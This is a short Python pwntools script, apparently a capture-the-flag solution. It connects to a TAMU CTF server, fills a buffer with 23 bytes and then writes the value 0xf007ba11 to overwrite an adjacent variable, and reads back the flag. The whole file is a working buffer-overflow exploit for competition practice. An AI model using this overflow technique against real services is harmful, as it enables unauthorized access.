from pwn import *

r = remote("pwn.ctf.tamu.edu", 4321)

print r.recvuntil("secret?")

p = "1"*23
p += p32(0xf007ba11)
print p
#print q
r.sendline(p)

#print r.recvuntil("\n")
print r.recvuntil("}")

